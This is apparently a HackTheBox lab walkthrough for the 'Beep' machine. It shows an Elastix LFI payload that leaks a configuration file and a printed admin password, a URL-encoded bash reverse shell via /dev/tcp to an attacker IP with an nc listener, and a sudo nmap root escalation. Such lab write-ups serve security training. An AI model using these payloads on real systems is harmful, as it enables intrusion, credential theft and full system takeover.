## Initial Exploit - 
***
The webpage on port 80 is running Elastix. Searchsploit has an exploit available. Download the exploit:  
> searchsploit -m 37637

The exploit does not work in it's current state. Try to manually visit the URL in the code:  
![](/home/kali/Walkthroughs/HackTheBox/beep/images/exp.png)

**view-source:https://10.129.84.243/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action** leaks passwords configured on the server:  
![](/home/kali/Walkthroughs/HackTheBox/beep/images/lfi.png)

Log in to Elastix v2.2.0 using the credentials **admin:jEhdIekWmdjE** at **https://10.129.84.243/**. Searchsploit has an exploit available. Download the exploit:  
> searchsploit -m 18649

Use the URL in the POC:  
![](/home/kali/Walkthroughs/HackTheBox/beep/images/rce_poc.png)

Visit the page **https://10.129.85.3/index.php?menu=control_panel#** to find the extension number 233. Change the [PHONE NUMBER] placeholder to 233. Change the [CMD] placeholder to **%2Fbin%2Fbash%20-l%20%3E%20%2Fdev%2Ftcp%2F10.10.16.16%2F80%200%3C%261%202%3E%261** which is **/bin/bash -l > /dev/tcp/10.10.16.16/80 0<&1 2>&1** urlencoded. 
> urlencode "/bin/bash -l > /dev/tcp/10.10.16.16/80 0<&1 2>&1"

Set up a listener: 
> sudo nc -lvnp 80

Visit the URL **https://10.129.85.3/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20%2Fbin%2Fbash%20-l%20%3E%20%2Fdev%2Ftcp%2F10.10.16.16%2F80%200%3C%261%202%3E%261%0D%0A%0D%0A** to trigger the reverse shell. 

The shell returns as asterisk.

<div style="page-break-after: always;"></div>

## Privilege Escalation - 
***
The user asterisk can run nmap as root without a password:  
![](/home/kali/Walkthroughs/HackTheBox/beep/images/sudo_l.png)

Spawn a root shell:  
> sudo nmap --interactive

> !sh

<div style="page-break-after: always;"></div>

## Proof - 
***
### User:

![](/home/kali/Walkthroughs/HackTheBox/beep/images/user.png)

### Root:

![](/home/kali/Walkthroughs/HackTheBox/beep/images/root.png)